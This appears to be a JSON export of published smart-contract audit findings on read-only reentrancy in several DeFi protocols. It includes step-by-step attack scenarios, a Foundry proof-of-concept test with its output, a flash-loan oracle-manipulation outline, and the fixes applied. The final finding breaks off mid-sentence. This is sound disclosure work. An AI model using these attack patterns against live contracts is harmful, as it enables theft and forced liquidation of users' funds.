@@ -1,0 +1,423 @@
+{
+  "tag": "Read-only Reentrancy",
+  "count": 6,
+  "metadata": {
+    "totalResults": 6,
+    "totalPages": 1
+  },
+  "last_rateLimit": {
+    "limit": 20,
+    "remaining": 15,
+    "reset": 1771761120
+  },
+  "findings": [
+    {
+      "id": "20820",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "934",
+      "title": "[M-03] Read-only reentrancy is possible",
+      "content": "\n<https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Swapper.sol#L206> <br><https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L131> <br><https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L110>\n\nThe agToken might be minted wrongly as rewards due to the reentrancy attack.\n\n### Proof of Concept\n\nThere are `redeem/swap` logics in the `transmuter` contract and all functions don't have a `nonReentrant` modifier.\n\nSo the typical reentrancy attack is possible during `redeem/swap` as I mentioned in my other report.\n\nBut besides that, the read-only reentrancy attack is possible from the `SavingsVest` contract, and the agToken might be minted/burnt incorrectly like this.\n\n1.  The [collatRatio](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L108) is `BASE_9(100%)` now and Alice starts a swap from collateral to agToken in `Swapper` contract.\n2.  In `_swap()`, it mints the agToken after depositing the collaterals.\n\n```solidity\n    if (mint) {\n        uint128 changeAmount = (amountOut.mulDiv(BASE_27, ts.normalizer, Math.Rounding.Up)).toUint128();\n        // The amount of stablecoins issued from a collateral are not stored as absolute variables, but\n        // as variables normalized by a `normalizer`\n        collatInfo.normalizedStables += uint216(changeAmount);\n        ts.normalizedStables += changeAmount;\n        if (permitData.length > 0) {\n            PERMIT_2.functionCall(permitData);\n        } else if (collatInfo.isManaged > 0)\n            IERC20(tokenIn).safeTransferFrom(\n                msg.sender,\n                LibManager.transferRecipient(collatInfo.managerData.config),\n                amountIn\n            );\n        else IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn); //@audit reentrancy\n        if (collatInfo.isManaged > 0) {\n            LibManager.invest(amountIn, collatInfo.managerData.config);\n        }\n        IAgToken(tokenOut).mint(to, amountOut);\n    }\n```\n\nAfter depositing the collaterals, Alice might have a hook in the case of ERC777 tokens before the agToken is minted.\n\n3.  Then Alice calls `SavingsVest.accrue()` inside the hook and [getCollateralRatio()](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L108) will return the incorrect ratio as the agToken isn't minted yet.\n4.  So `collatRatio` will be [larger than the real value](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/libraries/LibGetters.sol#L87) and additional rewards would be minted if `collatRatio > BASE_9 + BASE_6`.\n\nThen Alice would get more rewards from the `SavingsVest`.\n\n### Recommended Mitigation Steps\n\nRecommend adding the `nonReentrant` modifer to [getCollateralRatio()](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Getters.sol#L78) as well as `redeem()/swap()` functions.\n\n**[Picodes (Angle) confirmed and commented](https://github.com/code-423n4/2023-06-angle-findings/issues/30#issuecomment-1628624214):**\n > So the assumption is that there is an accepted collateral `ERC777`, which is really unlikely as there is no credible candidate and it would bring additional risk. But the scenario is valid.\n\n**[Angle mitigated](https://github.com/code-423n4/2023-07-angle-mitigation/blob/main/README.md#mitigations-to-be-reviewed):**\n> PR: https://github.com/AngleProtocol/angle-transmuter/commit/864c1c47cb550f8e337244f0f70409a171a4e671<br>\n> Adds a reentrancy guard to several functions.\n\n**Status:** Mitigation confirmed. Full details in reports from [Lambda](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/10), [auditor0517](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/27), and [Jeiwan](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/18).\n\n\n\n***\n\n",
+      "summary": "\nA bug was reported in the Angle Protocol's Transmuter Contract, which allows for the minting of agToken as rewards. This bug could be exploited by a reentrancy attack, which could cause the agToken to be minted incorrectly. \n\nThe bug is caused by the lack of a nonReentrant modifier in the `redeem/swap` logics in the `transmuter` contract. A read-only reentrancy attack is possible from the `SavingsVest` contract, which could result in the incorrect minting of agToken. \n\nThe attack would work as follows: Alice starts a swap from collateral to agToken in the `Swapper` contract. After depositing the collaterals, Alice could have a hook in the case of ERC777 tokens before the agToken is minted. Alice then calls `SavingsVest.accrue()` inside the hook and `getCollateralRatio()` will return the incorrect ratio as the agToken isn't minted yet. This would result in the `collatRatio` being larger than the real value, resulting in additional rewards being minted. \n\nThe recommended mitigation step is to add the `nonReentrant` modifer to `getCollateralRatio()` as well as `redeem()/swap()` functions. This has been confirmed by Picodes (Angle) and mitigated in a PR, which adds a reentrancy guard to several functions.",
+      "report_date": {},
+      "contest_prize_txt": "$52,500 USDC",
+      "contest_link": "https://code4rena.com/reports/2022-01-dev-test-repo",
+      "sponsor_name": "Angle Protocol",
+      "sponsor_link": "",
+      "quality_score": 4.5,
+      "general_score": 4,
+      "source_link": "https://code4rena.com/reports/2022-01-dev-test-repo",
+      "github_link": "https://github.com/code-423n4/2023-06-angle-findings/issues/30",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "255",
+      "slug": "m-03-read-only-reentrancy-is-possible-code4rena-angle-protocol-angle-protocol-invitational-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Angle Protocol",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Angle Protocol",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Read-only Reentrancy"
+          }
+        }
+      ]
+    },
+    {
+      "id": "18434",
+      "kind": "MARKDOWN",
+      "auditfirm_id": "11",
+      "impact": "HIGH",
+      "finders_count": 4,
+      "protocol_id": "828",
+      "title": "Read-only reentrancy",
+      "content": "**Description:** The current implementation is vulnerable to read-only reentrancy, especially in [Wells::removeLiquidity](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/Well.sol#L440).\nThe implementation does not strictly follow the [Checks-Effects-Interactions (CEI) pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) as it is setting the new reserve values after sending out the tokens. This is not an immediate risk to the protocol itself due to the `nonReentrant` modifier, but this is still vulnerable to [read-only reentrancy](https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/).\n\nMalicious attackers and unsuspecting ecosystem participants can deploy Wells with ERC-777 tokens (which have a callback that can take control) and exploit this vulnerability. This will lead to critical vulnerabilities given that the Wells are to be extended with price functions as defined by pumps - third-party protocols that integrate these on-chain oracles will be at risk.\n\nPumps are updated before token transfers; however, reserves are only set after. Therefore, pump functions will likely be incorrect on a re-entrant read-only call if `IWell(well).getReserves()` is called but reserves have not been correctly updated. The implementation of `GeoEmaAndCumSmaPump` appears not to be vulnerable, but given that each pump can choose its approach for recording a well's reserves over time, this remains a possible attack vector.\n\n**Impact:** Although this is not an immediate risk to the protocol itself, read-only re-entrancy can lead to critical issues, so we evaluate the severity as HIGH.\n\n**Proof of Concept:** We wrote a test case to show the existing read-only reentrancy.\n\n```solidity\n// MockCallbackRecipient.sol\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.17;\n\nimport {console} from \"forge-std/Test.sol\";\n\ncontract MockCallbackRecipient {\n    fallback() external payable {\n        console.log(\"here\");\n        (bool success, bytes memory result) = msg.sender.call(abi.encodeWithSignature(\"getReserves()\"));\n        if (success) {\n            uint256[] memory reserves = abi.decode(result, (uint256[]));\n            console.log(\"read-only-reentrancy beforeTokenTransfer reserves[0]: %s\", reserves[0]);\n            console.log(\"read-only-reentrancy beforeTokenTransfer reserves[1]: %s\", reserves[1]);\n        }\n    }\n}\n\n// NOTE: Put in Exploit.t.sol\nfunction test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() public {\n    IERC20 callbackToken = IERC20(new MockCallbackToken(\"CallbackToken\", \"CBTKN\", 18));\n    MockToken(address(callbackToken)).mint(user, 1000e18);\n    IERC20[] memory _tokens = new IERC20[](2);\n    _tokens[0] = callbackToken;\n    _tokens[1] = tokens[1];\n\n    vm.stopPrank();\n    Well well2 = Well(auger.bore(\"Well2\", \"WELL2\", _tokens, wellFunction, pumps));\n    approveMaxTokens(user, address(well2));\n\n    uint[] memory amounts = new uint[](2);\n    amounts[0] = 100 * 1e18;\n    amounts[1] = 100 * 1e18;\n\n    changePrank(user);\n    callbackToken.approve(address(well2), type(uint).max);\n    uint256 lpAmountOut = well2.addLiquidity(amounts, 0, user);\n\n    well2.removeLiquidity(lpAmountOut, amounts, user);\n}\n```\n\nThe output is shown below.\n\n```\nforge test -vv --match-test test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken\n\n[PASS] test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() (gas: 5290876)\nLogs:\n  read-only-reentrancy beforeTokenTransfer reserves[0]: 0\n  read-only-reentrancy beforeTokenTransfer reserves[1]: 0\n  read-only-reentrancy afterTokenTransfer reserves[0]: 0\n  read-only-reentrancy afterTokenTransfer reserves[1]: 0\n  read-only-reentrancy beforeTokenTransfer reserves[0]: 100000000000000000000\n  read-only-reentrancy beforeTokenTransfer reserves[1]: 100000000000000000000\n  read-only-reentrancy afterTokenTransfer reserves[0]: 100000000000000000000\n  read-only-reentrancy afterTokenTransfer reserves[1]: 100000000000000000000\n\nTest result: ok. 1 passed; 0 failed; finished in 3.66ms\n```\n\n**Recommended Mitigation:** Implement the CEI pattern in relevant functions by updating reserves before making external calls. For example, the function `Well::removeLiquidity` can be modified shown below.\n\n```solidity\nfunction removeLiquidity(\n    uint lpAmountIn,\n    uint[] calldata minTokenAmountsOut,\n    address recipient\n) external nonReentrant returns (uint[] memory tokenAmountsOut) {\n    IERC20[] memory _tokens = tokens();\n    uint[] memory reserves = _updatePumps(_tokens.length);\n    uint lpTokenSupply = totalSupply();\n\n    tokenAmountsOut = new uint[](_tokens.length);\n    _burn(msg.sender, lpAmountIn);\n\n    _setReserves(reserves); // @audit CEI pattern\n\n    for (uint i; i < _tokens.length; ++i) {\n        tokenAmountsOut[i] = (lpAmountIn * reserves[i]) / lpTokenSupply;\n        require(\n            tokenAmountsOut[i] >= minTokenAmountsOut[i],\n            \"Well: slippage\"\n        );\n        _tokens[i].safeTransfer(recipient, tokenAmountsOut[i]);\n        reserves[i] = reserves[i] - tokenAmountsOut[i];\n    }\n\n    emit RemoveLiquidity(lpAmountIn, tokenAmountsOut);\n}\n```\n\n**Beanstalk:** Added a check to the `getReserves()` function that reverts if the Reentrancy guard has been entered. This prevents anyone from calling `getReserves()` while executing a function in the Well. Fixed in commit [fcbf04a](https://github.com/BeanstalkFarms/Basin/pull/85/commits/fcbf04a99b00807891fb2a9791ba18ed425479ab).\n\n**Cyfrin:** Acknowledged.\n\n\\clearpage",
+      "summary": "\nThis bug report describes a vulnerability in the current implementation of the Wells smart contract. It is vulnerable to read-only reentrancy, which is a type of attack that can be exploited by malicious attackers or unsuspecting ecosystem participants. This vulnerability is caused by the fact that the implementation does not follow the Checks-Effects-Interactions (CEI) pattern, which sets the new reserve values before sending out tokens. This can lead to critical vulnerabilities, especially when the Wells are extended with price functions defined by pumps. \n\nTo demonstrate the vulnerability, a test case was written to show the existing read-only reentrancy. It showed that when the `getReserves()` function was called before reserves had been correctly updated, the pump functions would likely be incorrect. \n\nThe severity of the vulnerability is HIGH. To mitigate the issue, the CEI pattern should be implemented in relevant functions by updating reserves before making external calls. A check was added to the `getReserves()` function that reverts if the Reentrancy guard has been entered, preventing anyone from calling `getReserves()` while executing a function in the Well.",
+      "report_date": {},
+      "contest_prize_txt": "",
+      "contest_link": "",
+      "sponsor_name": "",
+      "sponsor_link": "",
+      "quality_score": 5,
+      "general_score": 5,
+      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-16-Beanstalk wells.md",
+      "github_link": "",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "",
+      "slug": "read-only-reentrancy-cyfrin-beanstalk-wells-markdown",
+      "firm_name": "Cyfrin",
+      "firm_logo_square": "Cyfrin_square.jpg",
+      "protocol_name": "Beanstalk Wells",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Cyfrin",
+        "logo_square": "Cyfrin_square.jpg"
+      },
+      "protocols_protocol": {
+        "name": "Beanstalk Wells",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 1
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Read-only Reentrancy"
+          }
+        }
+      ]
+    },
+    {
+      "id": "18493",
+      "kind": "GIT",
+      "auditfirm_id": "3",
+      "impact": "HIGH",
+      "finders_count": 1,
+      "protocol_id": "617",
+      "title": "H-13: `BalancerPairOracle` can be manipulated using read-only reentrancy",
+      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/141 \n\n## Found by \ncuthalion0x\n## Summary\n\n`BalancerPairOracle.getPrice` makes an external call to `BalancerVault.getPoolTokens` without checking the Balancer Vault's reentrancy guard. As a result, the oracle can be trivially manipulated to liquidate user positions prematurely.\n\n## Vulnerability Detail\n\nIn February, the Balancer team disclosed a read-only reentrancy vulnerability in the Balancer Vault. The detailed disclosure can be found [here](https://forum.balancer.fi/t/reentrancy-vulnerability-scope-expanded/4345). In short, all Balancer pools are susceptible to manipulation of their external queries, and all integrations must now take an extra step of precaution when consuming data. Via reentrancy, an attacker can force token balances and BPT supply to be out of sync, creating very inaccurate BPT prices.\n\nSome protocols, such as Sentiment, remained unaware of this issue for a few months and were later [hacked](https://twitter.com/spreekaway/status/1643313471180644360) as a result.\n\n`BalancerPairOracle.getPrice` makes a price calculation of the form `f(balances) / pool.totalSupply()`, so it is clearly vulnerable to synchronization issues between the two data points. A rough outline of the attack might look like this:\n\n```solidity\nAttackerContract.flashLoan() ->\n    // Borrow lots of tokens and trigger a callback.\n    SomeProtocol.flashLoan() ->\n        AttackerContract.exploit()\n\nAttackerContract.exploit() ->\n    // Join a Balancer Pool using the borrowed tokens and send some ETH along with the call.\n    BalancerVault.joinPool() ->\n        // The Vault will return the excess ETH to the sender, which will reenter this contract.\n        // At this point in the execution, the BPT supply has been updated but the token balances have not.\n        AttackerContract.receive()\n\nAttackerContract.receive() ->\n    // Liquidate a position using the same Balancer Pool as collateral.\n    BlueBerryBank.liquidate() ->\n        // Call to the oracle to check the price.\n        BalancerPairOracle.getPrice() ->\n            // Query the token balances. At this point in the execution, these have not been updated (see above).\n            // So, the balances are still the same as before the start of the large pool join.\n            BalancerVaul.getPoolTokens()\n\n            // Query the BPT supply. At this point in the execution, the supply has already been updated (see above).\n            // So, it includes the latest large pool join, and as such the BPT supply has grown by a large amount.\n            BalancerPool.getTotalSupply()\n\n            // Now the price is computed using both balances and supply, and the result is much smaller than it should be.\n            price = f(balances) / pool.totalSupply()\n\n        // The position is liquidated under false pretenses.\n```\n\n## Impact\n\nUsers choosing Balancer pool positions (such as Aura vaults) as collateral can be prematurely liquidated due to unreliable price data.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/oracle/BalancerPairOracle.sol#L70-L92\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe Balancer team recommends utilizing their [official library](https://github.com/balancer/balancer-v2-monorepo/blob/3ce5138abd8e336f9caf4d651184186fffcd2025/pkg/pool-utils/contracts/lib/VaultReentrancyLib.sol) to safeguard queries such as `Vault.getPoolTokens`. However, the library makes a state-modifying call to the Balancer Vault, so it is not suitable for `view` functions such as `BalancerPairOracle.getPrice`. There are then two options:\n1. Invoke the library somewhere else. Perhaps insert a hook into critical system functions like `BlueBerryBank.liquidate`.\n2. Adapt a slightly different read-only solution that checks the Balancer Vault's reentrancy guard without actually entering.",
+      "summary": "\nThis bug report is about the `BalancerPairOracle` contract, which is used to calculate the price of a Balancer Pool Token (BPT). The issue is that the `BalancerPairOracle.getPrice` function makes an external call to `BalancerVault.getPoolTokens` without checking the Balancer Vault's reentrancy guard. This means that the Oracle can be manipulated to liquidate user positions prematurely, as the price calculation is based on a combination of token balances and BPT supply.\n\nThe vulnerability was found by cuthalion0x and was initially disclosed by the Balancer team in February. It was later exploited in a hack of the Sentiment protocol.\n\nThe code snippet provided is from the `BalancerPairOracle.sol` file, line 70 to 92. The tool used was manual review.\n\nThe Balancer team recommends using their official library to safeguard queries such as `Vault.getPoolTokens`. However, this library makes a state-modifying call to the Balancer Vault, so it is not suitable for `view` functions such as `BalancerPairOracle.getPrice`. There are two possible solutions: 1. Invoke the library somewhere else, such as in critical system functions like `BlueBerryBank.liquidate`, or 2. Adapt a slightly different read-only solution that checks the Balancer Vault's reentrancy guard without actually entering.",
+      "report_date": {},
+      "contest_prize_txt": "16000 USDC",
+      "contest_link": "https://app.sherlock.xyz/audits/contests/69",
+      "sponsor_name": null,
+      "sponsor_link": "",
+      "quality_score": 5,
+      "general_score": 5,
+      "source_link": "",
+      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/141",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "69",
+      "slug": "h-13-balancerpairoracle-can-be-manipulated-using-read-only-reentrancy-sherlock-none-blueberry-update-git",
+      "firm_name": "Sherlock",
+      "firm_logo_square": "sherlock_square.png",
+      "protocol_name": "Blueberry Update",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Sherlock",
+        "logo_square": "sherlock_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Blueberry Update",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Lending"
+            },
+            "score": 1
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Leveraged Farming"
+            },
+            "score": 1
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Options Vault"
+            },
+            "score": 1
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Oracle"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Flash Loan"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Read-only Reentrancy"
+          }
+        }
+      ]
+    },
+    {
+      "id": "7112",
+      "kind": "PDF",
+      "auditfirm_id": "6",
+      "impact": "HIGH",
+      "finders_count": 5,
+      "protocol_id": "16",
+      "title": "Balancer Read-Only Reentrancy Vulnerability (Changes from dev team added to audit.)",
+      "content": "## Security Advisory\n\n**Severity:** High Risk  \n**Context:** CronV1Pool.sol#L1250  \n\n**Description:**  \nBalancer's read-only reentrancy vulnerability potentially affects the following Cron-Fi TWAMM functions:\n- `getVirtualReserves`\n- `getVirtualPriceOracle`\n- `executeVirtualOrdersToBlock`  \n\nA mitigation was provided by the Balancer team that uses a minimum amount of gas to trigger a reentrancy check. The Balancer vulnerability is discussed in greater detail [here](https://example.com/reentrancy-vulnerability-scope-expanded/4345).\n\n**Recommendation:**  \nInstall the mitigation into the aforementioned methods, changing them to non-view functions, but documenting that they do not meaningfully modify state. If possible, confirm that the mitigation is not needed by testing the methods without it and removing it if shown to not be a problem.\n\n**TWAMM:** Addressed in commit 5a529da.  \n**Spearbit:** Verified.",
+      "summary": "\nThis bug report is about a high-risk reentrancy vulnerability that was identified in the CronV1Pool.sol at line 1250. This vulnerability potentially affects three functions: getVirtualReserves, getVirtualPriceOracle, and executeVirtualOrdersToBlock. The Balancer team provided a mitigation to this vulnerability which involves adding a minimum amount of gas to trigger a reentrancy check. The recommendation is to install the mitigation in the affected functions, changing them to non-view functions, but documenting that they do not modify the state. If possible, it is suggested to test the methods without the mitigation, and if it is shown to not be a problem, the mitigation can be removed. The Twamm team addressed this bug in commit 5a529da, and the Spearbit team verified it.",
+      "report_date": {},
+      "contest_prize_txt": "",
+      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
+      "sponsor_name": "",
+      "sponsor_link": "",
+      "quality_score": 5,
+      "general_score": 4,
+      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
+      "github_link": "",
+      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/CronFinance-Spearbit-Security-Review.pdf",
+      "pdf_page_from": 6,
+      "contest_id": "",
+      "slug": "balancer-read-only-reentrancy-vulnerability-changes-from-dev-team-added-to-audit-spearbit-cron-finance-pdf",
+      "firm_name": "Spearbit",
+      "firm_logo_square": "spearbit_square.png",
+      "protocol_name": "Cron Finance",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Spearbit",
+        "logo_square": "spearbit_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Cron Finance",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Bridge"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Staking Pool"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Read-only Reentrancy"
+          }
+        }
+      ]
+    },
+    {
+      "id": "13182",
+      "kind": "MARKDOWN",
+      "auditfirm_id": "8",
+      "impact": "MEDIUM",
+      "finders_count": 2,
+      "protocol_id": "26",
+      "title": "Potential Reentrancy Into Strategies",
+      "content": "#### Resolution\n\n\n\n*EigenLabs Quick Summary:* The `StrategyBase` contract may be vulnerable to a token contract that employs some sort of callback to a function like `sharesToUnderlyingView`, before the balance change is reflected in the contract. The shares have been decremented, which would lead to an incorrect return value from `sharesToUnderlyingView`.\n\n\n*EigenLabs Response:* As noted in the report, this is not an issue if the token contract being used does not allow for reentrancy. For now, we will make it clear both in the contracts as well as the docs that our implementation of `StrategyBase.sol` does not support tokens with reentrancy. Because of the way our system is designed, anyone can choose to design a strategy with this in mind!\n\n\n\n\n#### Description\n\n\nThe `StrategyManager` contract is the entry point for deposits into and withdrawals from strategies. More specifically, to deposit into a strategy, a staker calls `depositIntoStrategy` (or anyone calls `depositIntoStrategyWithSignature` with the staker’s signature) then the asset is transferred from the staker to the strategy contract. After that, the strategy’s `deposit` function is called, followed by some bookkeeping in the `StrategyManager`. For withdrawals (and slashing), the `StrategyManager` calls the strategy’s `withdraw` function, which transfers the given amount of the asset to the given recipient. Both token transfers are a potential source of reentrancy if the token allows it.\n\n\nThe `StrategyManager` uses OpenZeppelin’s `ReentrancyGuardUpgradeable` as reentrancy protection, and the relevant functions have a `nonReentrant` modifier. The `StrategyBase` contract – from which concrete strategies should be derived – does not have reentrancy protection. However, the functions `deposit` and `withdraw` can only be called from the `StrategyManager`, so reentering these is impossible.\n\n\nNevertheless, other functions could be reentered, for example, `sharesToUnderlyingView` and `underlyingToSharesView`, as well as their (supposedly) non-`view` counterparts.\n\n\nLet’s look at the `withdraw` function in `StrategyBase`. First, the `amountShares` shares are burnt, and at the end of the function, the equivalent amount of `token` is transferred to the `depositor`:\n\n\n**src/contracts/strategies/StrategyBase.sol:L108-L143**\n\n\n\n```\nfunction withdraw(address depositor, IERC20 token, uint256 amountShares)\n    external\n    virtual\n    override\n    onlyWhenNotPaused(PAUSED\\_WITHDRAWALS)\n    onlyStrategyManager\n{\n    require(token == underlyingToken, \"StrategyBase.withdraw: Can only withdraw the strategy token\");\n    // copy `totalShares` value to memory, prior to any decrease\n    uint256 priorTotalShares = totalShares;\n    require(\n        amountShares <= priorTotalShares,\n        \"StrategyBase.withdraw: amountShares must be less than or equal to totalShares\"\n    );\n\n    // Calculate the value that `totalShares` will decrease to as a result of the withdrawal\n    uint256 updatedTotalShares = priorTotalShares - amountShares;\n    // check to avoid edge case where share rate can be massively inflated as a 'griefing' sort of attack\n    require(updatedTotalShares >= MIN\\_NONZERO\\_TOTAL\\_SHARES || updatedTotalShares == 0,\n        \"StrategyBase.withdraw: updated totalShares amount would be nonzero but below MIN\\_NONZERO\\_TOTAL\\_SHARES\");\n    // Actually decrease the `totalShares` value\n    totalShares = updatedTotalShares;\n\n    /\\*\\*\n \\* @notice calculation of amountToSend \\*mirrors\\* `sharesToUnderlying(amountShares)`, but is different since the `totalShares` has already\n \\* been decremented. Specifically, notice how we use `priorTotalShares` here instead of `totalShares`.\n \\*/\n    uint256 amountToSend;\n    if (priorTotalShares == amountShares) {\n        amountToSend = \\_tokenBalance();\n    } else {\n        amountToSend = (\\_tokenBalance() \\* amountShares) / priorTotalShares;\n    }\n\n    underlyingToken.safeTransfer(depositor, amountToSend);\n}\n\n```\nIf we assume that the `token` contract has a callback to the recipient of the transfer *before* the actual balance changes take place, then the recipient could reenter the strategy contract, for example, in `sharesToUnderlyingView`:\n\n\n**src/contracts/strategies/StrategyBase.sol:L159-L165**\n\n\n\n```\nfunction sharesToUnderlyingView(uint256 amountShares) public view virtual override returns (uint256) {\n    if (totalShares == 0) {\n        return amountShares;\n    } else {\n        return (\\_tokenBalance() \\* amountShares) / totalShares;\n    }\n}\n\n```\nThe crucial point is: If the callback is executed *before* the actual balance change, then `sharesToUnderlyingView` will report a bad result because the shares have already been burnt. Still, the token balance has not been updated yet.\n\n\nFor deposits, the token transfer to the strategy happens first, and the shares are minted after that:\n\n\n**src/contracts/core/StrategyManager.sol:L643-L652**\n\n\n\n```\nfunction \\_depositIntoStrategy(address depositor, IStrategy strategy, IERC20 token, uint256 amount)\n    internal\n    onlyStrategiesWhitelistedForDeposit(strategy)\n    returns (uint256 shares)\n{\n    // transfer tokens from the sender to the strategy\n    token.safeTransferFrom(msg.sender, address(strategy), amount);\n\n    // deposit the assets into the specified strategy and get the equivalent amount of shares in that strategy\n    shares = strategy.deposit(token, amount);\n\n```\n**src/contracts/strategies/StrategyBase.sol:L69-L99**\n\n\n\n```\nfunction deposit(IERC20 token, uint256 amount)\n    external\n    virtual\n    override\n    onlyWhenNotPaused(PAUSED\\_DEPOSITS)\n    onlyStrategyManager\n    returns (uint256 newShares)\n{\n    require(token == underlyingToken, \"StrategyBase.deposit: Can only deposit underlyingToken\");\n\n    /\\*\\*\n \\* @notice calculation of newShares \\*mirrors\\* `underlyingToShares(amount)`, but is different since the balance of `underlyingToken`\n \\* has already been increased due to the `strategyManager` transferring tokens to this strategy prior to calling this function\n \\*/\n    uint256 priorTokenBalance = \\_tokenBalance() - amount;\n    if (priorTokenBalance == 0 || totalShares == 0) {\n        newShares = amount;\n    } else {\n        newShares = (amount \\* totalShares) / priorTokenBalance;\n    }\n\n    // checks to ensure correctness / avoid edge case where share rate can be massively inflated as a 'griefing' sort of attack\n    require(newShares != 0, \"StrategyBase.deposit: newShares cannot be zero\");\n    uint256 updatedTotalShares = totalShares + newShares;\n    require(updatedTotalShares >= MIN\\_NONZERO\\_TOTAL\\_SHARES,\n        \"StrategyBase.deposit: updated totalShares amount would be nonzero but below MIN\\_NONZERO\\_TOTAL\\_SHARES\");\n\n    // update total share amount\n    totalShares = updatedTotalShares;\n    return newShares;\n}\n\n```\nThat means if there is a callback in the token’s `transferFrom` function and it is executed *after* the balance change, a reentering call to `sharesToUnderlyingView` (for example) will again return a wrong result because shares and token balances are not “in sync.”\n\n\nIn addition to the reversed order of token transfer and shares update, there’s another vital difference between `withdraw` and `deposit`: For withdrawals, the call to the token contract originates in the strategy, while for deposits, it is the strategy *manager* that initiates the call to the token contract (before calling into the strategy). That’s a technicality that has consequences for reentrancy protection: Note that for withdrawals, it is the strategy contract that is reentered, while for deposits, there is not a single contract that is reentered; instead, it is the contract *system* that is in an inconsistent state when the reentrancy happens. Hence, reentrancy protection on the level of individual contracts is not sufficient.\n\n\nFinally, we want to discuss though *which* functions in the strategy contract the system could be reentered. As mentioned, `deposit` and `withdraw` can only be called by the strategy manager, so these two can be ruled out. For the examples above, we considered `sharesToUnderlyingView`, which (as the name suggests) is a `view` function. As such, it can’t change the state of the contract, so reentrancy through a `view` function can only be a problem for *other* contracts that use this function and rely on its return value. However, there is also a potentially state-changing variant, `sharesToUnderlying`, and similar potentially state-changing functions, such as `underlyingToShares` and `userUnderlying`. Currently, these functions are not *actually* state-changing, but the idea is that they could be and, in some concrete strategy implementations that inherit from `StrategyBase`, will be. In such cases, these functions could make wrong state changes due to state inconsistency during reentrancy.\n\n\nThe examples above assume that the token contract allows reentrancy through its `transfer` function *before* the balance change has been made or in its `transferFrom` function *after*. It might be tempting to argue that tokens which don’t fall into this category are safe to use. While the examples discussed above are the most interesting attack vectors we found, there might still be others: To illustrate this point, assume a token contract that allows reentrancy through `transferFrom` only before any state change in the token takes place. The token transfer is the first thing that happens in `StrategyManager._depositIntoStrategy`, and the state changes (user shares) and calling the 